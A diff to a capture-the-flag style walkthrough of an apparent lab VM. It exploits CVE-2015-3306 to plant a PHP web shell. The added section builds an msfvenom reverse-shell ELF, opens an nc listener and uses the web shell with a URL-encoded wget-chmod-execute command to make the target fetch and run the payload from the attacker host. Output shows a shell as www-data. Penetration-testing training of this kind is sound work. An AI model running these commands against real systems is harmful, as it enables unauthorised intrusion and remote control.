@@ -2338,7 +2338,7 @@ Googling for the related CVE-2015-3306 returns a viable [exploit on GitHub](http
 
 The exploit uploads a RCE payload `<?php echo passthru($_GET['cmd']); ?>` on `backdoor.php` to the directory specified
 
-Coincidentally, we were informed by the  `version_control` document that the DocumentRoot is at `/var/www/tryingharderisjoy`
+Coincidentally, we were informed by the  `version_control` document that the webroot is at `/var/www/tryingharderisjoy`
 
 ```console
 ┌──(root㉿kali)-[~]
@@ -2357,4 +2357,50 @@ Coincidentally, we were informed by the  `version_control` document that the Doc
 [+] Done
 ```
 
-Well done, we now have RCE ability on the target as `www-data` user
+# 5. Getting a shell
+
+Generate reverse shell executable and place in web server root:
+
+(Apache2 is already running with DocumentRoot at `/var/www/html`)
+
+```console
+┌──(root㉿kali)-[~]
+└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: /var/www/html/reverse.elf
+```
+
+Open another console window on Kali to listen for connections:
+
+```console
+┌──(root㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Getting the target to download and run the reverse shell:
+
+☝️ The command we want to run is `wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`, but since we are running it from URL, we need to URL encode the command
+
+```console
+┌──(root㉿kali)-[~]
+└─# curl http://10.0.88.34/backdoor.php?cmd=wget%20http%3A%2F%2Fkali.vx%2Freverse.elf%20%26%26%20chmod%20%2Bx%20.%2Freverse.elf%20%26%26%20.%2Freverse.elf
+```
+
+Verify that the reverse shell has hooked on from the listener console
+
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.34] 53118
+whoami
+www-data
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+pwd
+/var/www/tryingharderisjoy
+```
+
+Well done, we now have a shell on the target as `www-data` user
